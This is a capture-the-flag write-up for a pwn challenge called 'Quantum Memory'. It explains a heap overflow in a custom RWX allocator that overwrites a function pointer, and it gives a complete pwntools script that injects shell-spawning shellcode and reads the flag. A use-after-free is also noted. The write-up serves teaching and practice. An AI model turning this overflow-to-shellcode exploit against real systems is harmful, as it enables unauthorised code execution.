# Quantum Memory

**Category:** pwn  **Author:** Solvz

Server side is in `deploy/` (`docker build -t quantum deploy && docker run -p 9999:9999 quantum`). The compiled binary is `deploy/quantum_memory`.

## Solution

A custom allocator hands out 0x100 byte chunks from one `mmap`ed pool, and the pool is mapped `RWX`. Each chunk is a node:

```c
typedef struct {
    char name[32];
    void (*print_func)(void*);    /* +0x20 */
    char data[0x100 - 32 - 8];    /* +0x28, 0xd8 bytes */
} DataNode;
```

"Edit" lets you write up to 0x100 bytes into `data`, which is only 0xd8 long. That's 40 bytes of overflow into the next chunk: its `name` and its `print_func`. "View" calls `nodes[idx]->print_func(nodes[idx])`. Option 5 even prints the pool base for us.

So:

1. Leak info (5) to get `pool_base`.
2. Allocate nodes 0 and 1. They land at `pool_base` and `pool_base + 0x100`.
3. Edit node 0: shellcode at the start of `data` (`pool_base + 0x28`), pad to 0xd8, 32 bytes for node 1's name, then `p64(pool_base + 0x28)`.
4. View node 1. It jumps into our shellcode on the executable pool.

```python
p.sendlineafter(b'>>> ', b'5')
p.recvuntil(b'Pool base: ')
pool = int(p.recvline(), 16)
for i in (0, 1):
    p.sendlineafter(b'>>> ', b'1')
    p.sendlineafter(b': ', str(i).encode())
    p.sendlineafter(b'Name: ', b'x')
sc = asm(shellcraft.sh())
payload = sc.ljust(0xd8, b'\x90') + b'B' * 32 + p64(pool + 0x28)
p.sendlineafter(b'>>> ', b'2')
p.sendlineafter(b'Index: ', b'0')
p.sendlineafter(b': ', str(len(payload)).encode())
p.sendafter(b'Data: ', payload)
p.sendlineafter(b'>>> ', b'3')
p.sendlineafter(b'Index: ', b'1')
p.sendline(b'cat flag.txt')
```

Delete also never clears `nodes[idx]`, so there's a use-after-free as well, but the overflow is enough on its own.

Flag is per-instance: `H7CTF{qu4ntum_h34p_3nT4ngl3m3nt_<uuid>}`
